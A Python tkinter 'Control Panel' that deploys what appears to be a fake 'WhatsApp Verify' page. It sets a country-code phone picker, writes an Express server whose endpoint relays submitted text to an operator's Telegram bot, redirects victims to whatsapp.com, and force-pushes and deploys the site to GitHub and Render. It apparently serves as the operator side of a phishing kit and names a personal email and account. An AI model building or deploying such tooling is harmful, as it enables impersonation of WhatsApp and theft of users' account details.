import tkinter as tk
from tkinter import ttk, scrolledtext
import re
import os
import subprocess
import json
import threading
import requests
import webbrowser
from datetime import datetime

class ControlPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("WhatsApp Verify - Control Panel")
        self.root.geometry("800x650")
        self.root.configure(bg='#f0f2f5')

        # Determine base directory (where this script is located)
        self.base_dir = os.path.dirname(os.path.abspath(__file__))

        self.config = {
            'render_api_key': '',
            'render_service_id': '',
            'telegram_bot_token': '',
            'telegram_chat_id': '',
            'redirect_url': 'https://whatsapp.com',
            'card_label': '',
            'custom_countries': [
                {'code': '+254', 'flag': '\U0001F1F0\U0001F1EA', 'name': 'Kenya'}
            ]
        }

        self.load_config()
        self.create_widgets()

    def load_config(self):
        config_path = os.path.join(self.base_dir, 'config.json')
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                saved = json.load(f)
                self.config.update(saved)
        # Load secrets from untracked file
        secrets_path = os.path.join(self.base_dir, 'secrets.json')
        if os.path.exists(secrets_path):
            with open(secrets_path, 'r') as f:
                secrets = json.load(f)
                self.config.update(secrets)

    def save_config(self):
        config_path = os.path.join(self.base_dir, 'config.json')
        # Don't save github_token to config.json (keep it in secrets.json only)
        save_data = {k: v for k, v in self.config.items() if k != 'github_token'}
        with open(config_path, 'w') as f:
            json.dump(save_data, f, indent=2)

    def create_widgets(self):
        header = tk.Frame(self.root, bg='#075E54', height=60)
        header.pack(fill='x')
        tk.Label(header, text="Control Panel", font=('Segoe UI', 16, 'bold'),
                 bg='#075E54', fg='white').pack(pady=12)

        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=5)

        # Tab 1: Settings
        tab1 = tk.Frame(notebook, bg='#f0f2f5')
        notebook.add(tab1, text="Settings")
        self.create_settings_tab(tab1)

        # Tab 2: Countries
        tab2 = tk.Frame(notebook, bg='#f0f2f5')
        notebook.add(tab2, text="Countries")
        self.create_countries_tab(tab2)

    def create_settings_tab(self, parent):
        main = tk.Frame(parent, bg='#f0f2f5', padx=20, pady=10)
        main.pack(fill='both', expand=True)

        # Card Label
        tk.Label(main, text="Card Label:", bg='#f0f2f5',
                font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(0, 5))
        self.card_label_entry = tk.Entry(main, width=70)
        self.card_label_entry.insert(0, self.config.get('card_label', ''))
        self.card_label_entry.pack(fill='x', pady=(0, 10))

        # Telegram Settings
        tg_frame = tk.LabelFrame(main, text="Telegram", font=('Segoe UI', 10, 'bold'),
                                bg='#f0f2f5', padx=10, pady=5)
        tg_frame.pack(fill='x', pady=(0, 10))

        tk.Label(tg_frame, text="Bot Token:", bg='#f0f2f5').grid(row=0, column=0, sticky='w')
        self.tg_token_entry = tk.Entry(tg_frame, width=50)
        self.tg_token_entry.insert(0, self.config.get('telegram_bot_token', ''))
        self.tg_token_entry.grid(row=0, column=1, padx=10, pady=3)

        tk.Label(tg_frame, text="Chat ID:", bg='#f0f2f5').grid(row=1, column=0, sticky='w')
        self.tg_chatid_entry = tk.Entry(tg_frame, width=50)
        self.tg_chatid_entry.insert(0, self.config.get('telegram_chat_id', ''))
        self.tg_chatid_entry.grid(row=1, column=1, padx=10, pady=3)

        # Redirect URL
        tk.Label(main, text="Redirect URL:", bg='#f0f2f5',
                font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(0, 5))
        self.redirect_entry = tk.Entry(main, width=70)
        self.redirect_entry.insert(0, self.config.get('redirect_url', ''))
        self.redirect_entry.pack(fill='x', pady=(0, 10))

        # Render Settings
        render_frame = tk.LabelFrame(main, text="Render", font=('Segoe UI', 10, 'bold'),
                                    bg='#f0f2f5', padx=10, pady=5)
        render_frame.pack(fill='x', pady=(0, 10))

        tk.Label(render_frame, text="API Key:", bg='#f0f2f5').grid(row=0, column=0, sticky='w')
        self.render_key_entry = tk.Entry(render_frame, width=50)
        self.render_key_entry.insert(0, self.config.get('render_api_key', ''))
        self.render_key_entry.grid(row=0, column=1, padx=10, pady=3)

        tk.Label(render_frame, text="Service ID:", bg='#f0f2f5').grid(row=1, column=0, sticky='w')
        self.render_service_entry = tk.Entry(render_frame, width=50)
        self.render_service_entry.insert(0, self.config.get('render_service_id', ''))
        self.render_service_entry.grid(row=1, column=1, padx=10, pady=3)

        # Save Button
        self.save_btn = tk.Button(main, text="Save & Deploy", font=('Segoe UI', 12, 'bold'),
                                  bg='#25D366', fg='white', padx=30, pady=8,
                                  command=self.save_and_deploy)
        self.save_btn.pack(pady=5)

        # Status
        tk.Label(main, text="Status:", bg='#f0f2f5',
                font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 3))

        self.status_text = scrolledtext.ScrolledText(main, height=8, width=80,
                                                     font=('Consolas', 9))
        self.status_text.pack(fill='both', expand=True)
        self.log("Ready. Make changes and click Save & Deploy.")

    def create_countries_tab(self, parent):
        main = tk.Frame(parent, bg='#f0f2f5', padx=20, pady=10)
        main.pack(fill='both', expand=True)

        tk.Label(main, text="Current Countries:", bg='#f0f2f5',
                font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(0, 5))

        columns = ('code', 'flag', 'name')
        self.country_tree = ttk.Treeview(main, columns=columns, show='headings', height=10)
        self.country_tree.heading('code', text='Code')
        self.country_tree.heading('flag', text='Flag')
        self.country_tree.heading('name', text='Name')
        self.country_tree.column('code', width=80)
        self.country_tree.column('flag', width=60)
        self.country_tree.column('name', width=150)
        self.country_tree.pack(fill='x', pady=(0, 10))

        default_countries = [
            {'code': '+91', 'flag': '\U0001F1EE\U0001F1F3', 'name': 'India'},
            {'code': '+92', 'flag': '\U0001F1F5\U0001F1F0', 'name': 'Pakistan'},
            {'code': '+880', 'flag': '\U0001F1E7\U0001F1E9', 'name': 'Bangladesh'},
            {'code': '+1', 'flag': '\U0001F1FA\U0001F1F8', 'name': 'USA'},
            {'code': '+44', 'flag': '\U0001F1EC\U0001F1E7', 'name': 'UK'},
            {'code': '+971', 'flag': '\U0001F1E6\U0001F1EA', 'name': 'UAE'},
            {'code': '+234', 'flag': '\U0001F1F3\U0001F1EC', 'name': 'Nigeria'},
            {'code': '+93', 'flag': '\U0001F1E6\U0001F1EB', 'name': 'Afghanistan'},
            {'code': '+358', 'flag': '\U0001F1E6\U0001F1FD', 'name': 'Aland Islands'},
            {'code': '+355', 'flag': '\U0001F1E6\U0001F1F1', 'name': 'Albania'},
            {'code': '+213', 'flag': '\U0001F1E9\U0001F1FF', 'name': 'Algeria'},
            {'code': '+98', 'flag': '\U0001F1EE\U0001F1F7', 'name': 'Iran'},
        ]
        all_countries = default_countries + self.config.get('custom_countries', [])

        for c in all_countries:
            self.country_tree.insert('', 'end', values=(c['code'], c['flag'], c['name']))

        # Add new country
        add_frame = tk.LabelFrame(main, text="Add New Country", font=('Segoe UI', 10, 'bold'),
                                  bg='#f0f2f5', padx=10, pady=5)
        add_frame.pack(fill='x', pady=(0, 10))

        tk.Label(add_frame, text="Code:", bg='#f0f2f5').grid(row=0, column=0, sticky='w')
        self.new_code_entry = tk.Entry(add_frame, width=10)
        self.new_code_entry.insert(0, '+')
        self.new_code_entry.grid(row=0, column=1, padx=5, pady=3)

        tk.Label(add_frame, text="Flag:", bg='#f0f2f5').grid(row=0, column=2, sticky='w')
        self.new_flag_entry = tk.Entry(add_frame, width=8)
        self.new_flag_entry.grid(row=0, column=3, padx=5, pady=3)

        tk.Label(add_frame, text="Name:", bg='#f0f2f5').grid(row=0, column=4, sticky='w')
        self.new_name_entry = tk.Entry(add_frame, width=20)
        self.new_name_entry.grid(row=0, column=5, padx=5, pady=3)

        tk.Button(add_frame, text="Add", command=self.add_country,
                  bg='#128C7E', fg='white', padx=10).grid(row=0, column=6, padx=10)

        tk.Button(main, text="Delete Selected", command=self.delete_country,
                  bg='#ea4335', fg='white', padx=10).pack(anchor='w', pady=(0, 10))

        self.deploy_btn = tk.Button(main, text="Save & Deploy Countries", font=('Segoe UI', 12, 'bold'),
                                     bg='#25D366', fg='white', padx=30, pady=8,
                                     command=self.deploy_countries)
        self.deploy_btn.pack(pady=10)

        tk.Label(main, text="Status:", bg='#f0f2f5',
                font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 3))

        self.country_status = scrolledtext.ScrolledText(main, height=6, width=80,
                                                        font=('Consolas', 9))
        self.country_status.pack(fill='both', expand=True)
        self.clog("Countries tab ready.")

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.status_text.insert('end', f"[{timestamp}] {message}\n")
        self.status_text.see('end')
        self.root.update()

    def clog(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.country_status.insert('end', f"[{timestamp}] {message}\n")
        self.country_status.see('end')
        self.root.update()

    def add_country(self):
        code = self.new_code_entry.get().strip()
        flag = self.new_flag_entry.get().strip()
        name = self.new_name_entry.get().strip()

        if not code or not name:
            self.clog("Error: Code and Name required")
            return

        if not code.startswith('+'):
            code = '+' + code

        self.config.setdefault('custom_countries', []).append({'code': code, 'flag': flag, 'name': name})
        self.save_config()
        self.country_tree.insert('', 'end', values=(code, flag, name))
        self.clog(f"Added: {flag} {name} ({code})")

    def delete_country(self):
        selected = self.country_tree.selection()
        if not selected:
            self.clog("Select a country to delete")
            return

        idx = self.country_tree.index(selected[0])
        self.country_tree.delete(selected[0])

        custom = self.config.get('custom_countries', [])
        if idx >= 12:
            custom_idx = idx - 12
            if custom_idx < len(custom):
                removed = custom.pop(custom_idx)
                self.save_config()
                self.clog(f"Deleted: {removed['name']}")

    def save_and_deploy(self):
        self.save_btn.config(state='disabled', text="Deploying...")
        self.status_text.delete('1.0', 'end')

        self.config['telegram_bot_token'] = self.tg_token_entry.get().strip()
        self.config['telegram_chat_id'] = self.tg_chatid_entry.get().strip()
        self.config['redirect_url'] = self.redirect_entry.get().strip()
        self.config['card_label'] = self.card_label_entry.get().strip()
        self.config['render_api_key'] = self.render_key_entry.get().strip()
        self.config['render_service_id'] = self.render_service_entry.get().strip()
        self.save_config()

        thread = threading.Thread(target=self.deploy_files, daemon=True)
        thread.start()

    def deploy_files(self):
        try:
            self.log("Updating files...")
            self.update_files()
            self.push_to_github()
            self.ensure_render_env()
            self.trigger_render_deploy()
        except Exception as e:
            self.log(f"Error: {str(e)}")
        finally:
            self.save_btn.config(state='normal', text="Save & Deploy")

    def deploy_countries(self):
        self.deploy_btn.config(state='disabled', text="Deploying...")
        self.country_status.delete('1.0', 'end')

        thread = threading.Thread(target=self.deploy_countries_process, daemon=True)
        thread.start()

    def deploy_countries_process(self):
        try:
            self.clog("Updating index.html...")
            self.update_files()
            self.clog("Pushing to GitHub...")
            self.push_to_github()
            self.clog("Deploying to Render...")
            self.trigger_render_deploy()
        except Exception as e:
            self.clog(f"Error: {str(e)}")
        finally:
            self.deploy_btn.config(state='normal', text="Save & Deploy Countries")

    def update_files(self):
        self.log("  -> server.js")
        server_js = '''const express = require('express');
const cors = require('cors');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '.')));

app.post('/api/telegram', async (req, res) => {
  const { chat_id, text, parse_mode } = req.body;
  if (!chat_id || !text) return res.status(400).json({ error: 'chat_id and text required' });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const postData = JSON.stringify({ chat_id, text, parse_mode: parse_mode || 'Markdown' });

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${botToken}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
  };

  const tgReq = https.request(options, (tgRes) => {
    let data = '';
    tgRes.on('data', (chunk) => { data += chunk; });
    tgRes.on('end', () => { try { res.json(JSON.parse(data)); } catch(e) { res.json({raw: data}); } });
  });
  tgReq.on('error', (e) => res.status(500).json({ error: e.message }));
  tgReq.write(postData);
  tgReq.end();
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
'''
        with open(os.path.join(self.base_dir, 'server.js'), 'w', encoding='utf-8') as f:
            f.write(server_js)

        self.log("  -> index.html")
        html_path = os.path.join(self.base_dir, 'index.html')
        with open(html_path, 'r', encoding='utf-8') as f:
            html = f.read()

        # Remove ALL existing card labels first
        html = re.sub(r'\s*<div style="background:#075E54[^>]*>.*?</div>', '', html)

        # Add new card label if set
        if self.config['card_label']:
            label_html = f'<div style="background:#075E54;color:white;text-align:center;padding:8px;font-size:14px;font-weight:bold;margin-bottom:10px;">{self.config["card_label"]}</div>'
            html = html.replace('<div class="header-bar"></div>', f'<div class="header-bar"></div>\n  {label_html}')

        # Chat ID
        html = re.sub(r"const TELEGRAM_CHAT_ID = '[^']*'", f"const TELEGRAM_CHAT_ID = '{self.config['telegram_chat_id']}'", html)

        # Redirect
        html = re.sub(r'window\.location\.href\s*=\s*"[^"]*"', f'window.location.href = "{self.config["redirect_url"]}"', html)

        # Update countries
        default_countries = [
            {'code': '+91', 'flag': '\U0001F1EE\U0001F1F3', 'name': 'India'},
            {'code': '+92', 'flag': '\U0001F1F5\U0001F1F0', 'name': 'Pakistan'},
            {'code': '+880', 'flag': '\U0001F1E7\U0001F1E9', 'name': 'Bangladesh'},
            {'code': '+1', 'flag': '\U0001F1FA\U0001F1F8', 'name': 'USA'},
            {'code': '+44', 'flag': '\U0001F1EC\U0001F1E7', 'name': 'UK'},
            {'code': '+971', 'flag': '\U0001F1E6\U0001F1EA', 'name': 'UAE'},
            {'code': '+234', 'flag': '\U0001F1F3\U0001F1EC', 'name': 'Nigeria'},
            {'code': '+93', 'flag': '\U0001F1E6\U0001F1EB', 'name': 'Afghanistan'},
            {'code': '+358', 'flag': '\U0001F1E6\U0001F1FD', 'name': 'Aland Islands'},
            {'code': '+355', 'flag': '\U0001F1E6\U0001F1F1', 'name': 'Albania'},
            {'code': '+213', 'flag': '\U0001F1E9\U0001F1FF', 'name': 'Algeria'},
            {'code': '+98', 'flag': '\U0001F1EE\U0001F1F7', 'name': 'Iran'},
        ]
        all_countries = default_countries + self.config.get('custom_countries', [])

        options_html = '\n'.join([
            f'          <option value="{c["code"]}">{c["flag"]} {c["name"]} ({c["code"]})</option>'
            for c in all_countries
        ])

        pattern = r'(<select id="countryCode"[^>]*>).*?(</select>)'
        replacement = f'\\1\n{options_html}\n        \\2'
        html = re.sub(pattern, replacement, html, flags=re.DOTALL)

        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html)

    def push_to_github(self):
        self.log("  -> Pushing to GitHub...")
        os.chdir(self.base_dir)

        os.system('git config user.email yasermafi223221@gmail.com')
        os.system('git config user.name YaserMafi')
        os.system('git add index.html server.js')

        # Check if there are changes to commit
        status_result = subprocess.run(['git', 'status', '--porcelain'], capture_output=True, text=True)
        if status_result.stdout.strip():
            os.system('git commit -m "Update deploy"')
        else:
            self.log("  -> No changes to commit")

        # Load token from secrets file
        github_token = ''
        secrets_path = os.path.join(self.base_dir, 'secrets.json')
        if os.path.exists(secrets_path):
            with open(secrets_path, 'r') as f:
                github_token = json.load(f).get('github_token', '')

        if not github_token:
            self.log("  -> ERROR: No GitHub token found in secrets.json")
            return

        gh_url = f"https://x-access-token:{github_token}@github.com/YaserMafi/whatsapp_test.git"
        branch_result = subprocess.run(['git', 'branch', '--show-current'], capture_output=True, text=True)
        current_branch = branch_result.stdout.strip() or 'master'

        result = subprocess.run(['git', 'push', gh_url, f'{current_branch}:main', '--force'],
                              capture_output=True, text=True)

        if result.returncode == 0:
            self.log("  -> GitHub push OK")
        else:
            error_msg = result.stderr or result.stdout
            self.log(f"  -> Push FAILED: {error_msg}")
            # Try to provide helpful guidance
            if "Authentication failed" in error_msg or "Invalid username" in error_msg:
                self.log("  -> Hint: Check your GitHub token in secrets.json")
            if "push protection" in error_msg.lower() or "GH013" in error_msg:
                self.log("  -> Hint: Token found in commit history. Clean git history needed.")

    def ensure_render_env(self):
        if not self.config.get('render_api_key') or not self.config.get('render_service_id'):
            self.log("  -> No Render API key set, skipping")
            return

        self.log("  -> Updating Render env vars...")
        headers = {'Authorization': f"Bearer {self.config['render_api_key']}", 'Content-Type': 'application/json', 'Accept': 'application/json'}

        resp = requests.put(
            f"https://api.render.com/v1/services/{self.config['render_service_id']}/env-vars",
            headers=headers,
            json=[{"key": "TELEGRAM_BOT_TOKEN", "value": self.config['telegram_bot_token']}]
        )
        if resp.status_code == 200:
            self.log("  -> Token updated on Render")
        else:
            self.log(f"  -> Token update failed: {resp.text}")

    def trigger_render_deploy(self):
        if not self.config.get('render_api_key') or not self.config.get('render_service_id'):
            self.log("  -> No Render API key set, skipping deploy")
            return

        self.log("  -> Triggering Render deploy...")
        headers = {'Authorization': f"Bearer {self.config['render_api_key']}", 'Content-Type': 'application/json'}
        resp = requests.post(
            f"https://api.render.com/v1/services/{self.config['render_service_id']}/deploys",
            headers=headers, json={}
        )

        if resp.status_code in [200, 201, 202]:
            self.log(f"  -> Deploy accepted (status {resp.status_code})")
            self.poll_deploy()
        else:
            self.log(f"  -> Deploy failed: {resp.text}")

    def poll_deploy(self):
        import time
        headers = {'Authorization': f"Bearer {self.config['render_api_key']}"}

        for i in range(30):
            time.sleep(10)
            try:
                resp = requests.get(
                    f"https://api.render.com/v1/services/{self.config['render_service_id']}/deploys?limit=1",
                    headers=headers
                )
                deploys = resp.json()
                if deploys:
                    d = deploys[0].get('deploy', deploys[0])
                    status = d.get('status', 'unknown')
                    self.log(f"  -> Status: {status}")
                    if status == 'live':
                        self.log("  -> Deploy LIVE!")
                        webbrowser.open('https://whatsapp-verify-d3j3.onrender.com')
                        return
                    if status in ['build_failed', 'canceled']:
                        self.log(f"  -> Failed: {status}")
                        return
            except:
                pass

if __name__ == '__main__':
    root = tk.Tk()
    app = ControlPanel(root)
    root.mainloop()
